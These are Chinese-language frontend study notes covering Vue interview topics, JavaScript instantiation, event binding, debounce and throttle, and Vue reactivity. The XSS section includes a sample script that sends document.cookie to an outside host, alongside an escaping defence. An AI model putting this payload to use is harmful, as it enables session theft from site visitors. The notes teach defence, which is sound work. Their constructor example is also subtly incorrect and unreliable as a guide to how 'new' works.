# Vue

## day2-2

### 面试题
* xss攻击，与防御
    * 跨域脚本攻击
    ```js
        ​<img src="xxx" onclick="go()" />
        <h4 style="color:#58bc58">点我有惊喜</h4>
        <script>
            localtion.href="http://www.laoxie.com?data="+document.cookie
        </script>
    ```
    * 防御：
        * 对输入输出进行过滤
        ```html
            ​&lt;img src="xxx" onclick="go()" /&gt;
        ```
* 实例化过程经历什么 new String()
    ```js
        function Mayun(){
            // 1. 创建一个对象
            let obj = {};

            //2. 将this指向obj
            Mayun.bind(obj)

            // 3. 执行内部代码，给obj添加属性
            this.xx1 = 'xx1'
            this.xx2 = 'xx2'
            this.xx3 = 'xx3'

            // 4. 改变原型对象
            obj.__proto__ = Mayun.prototype

            // 5. 返回这个对象
            return obj
        }

        let my = new Mayun();// Mayun()

    ```
* 什么叫轮询
    * 用自己的语言表达出来
* 事件绑定方式，和移除方式
```js
    <button onclick="show()">点我有惊喜</button>

    ele.onclick = show; // ele.onclick = null;
    ele.addEventListener('click',show,false);// ele.removeEventListener('click',show,false)

    function show(){
        
    }
```
* 二次封装
    * 提高开发效率
    * 在封装的基础上再封装
* 防抖与节流
    * 目的为了优化性能
    * 节流：只执行第一次，忽略后面所有操作
        * 滚动加载
    * 防抖：只执行最后一次，忽略前面所有操作
        * 百度搜索建议

### 知识点
* 前端三大框架
    * angular
    * react
    * vue
* 渐进式
    * 核心 -> 配套框架、插件 -> 扩展性
* 安装版本
    * 开发版本  development
        * 完整未压缩：调试、测试，本地开发使用
    * 生产版本  production
        * 压缩合并：删除了警告，上线使用
    * CDN
    * npm / yarn

## day2-3

### 面试题
* Vue双向数据绑定的原理
    * Model -> View : getter&setter
    * View -> Model : 事件

    * v-model 的原理：能用什么操作来替代v-model（单向加+事件）
        * {{}}
        * v-bind
* 实例化对象的执行过程
    1. 创建一个对象 vm->Object.prototype
    2. 改变this指向
    3. 改变原型对象的向 vm->Vue.prototype
    4. 执行构造函数中的代码，给vm添加属性
    5. 返回vm
* http协议与ws协议的区别
    * socket心跳

### 复习
* 属性特性
    > 传统方式定义属性，属性特性默认为true，通过Object.defineProperty定义的属性，属性特性默认为false
    * 值属性
        * configurable
        * enumerable
        * writable
        * value
    * 存储器属性
        * configurable
        * enumerable
        * get
        * set

        obj = {
            a:10,
            b:function(){

            },
            get c(){
                return this.a;
            },
            set c(val){
                this.a = val
                // 为所欲为
            }
        }

        obj.b()
        obj.c ;//10
        obj.c = 100
* Vue
    * 指令
        * v-on      @
        * v-bind    :
            * 属性
                * class
                * style
        * v-model
        * v-if/v-else-if/v-else
        * v-for
            * in
            * of
        * v-show
        * 
    * 实例化配置参数
    * 响应式属性
        * 初始化data
        * Vue.set(target,key,val) / vm.$set(target,key,val)
            * target不可以是vm实例和data属性
        * 数组变异方法
    * 架构模式
        * MVC
        * MVP
        * MVVM
    * 思维的转变
        * 关注节点操作 -> 关注数据

### 知识点
* Vue实例化过程
    * 这里定义的data为值属性
    但在实例化后，Vue会通过Object.defineProperty()把他们变成存储器属性（getter&setter）
    并写入vm实例（意味着可以在代码中通过this访问到这些属性）
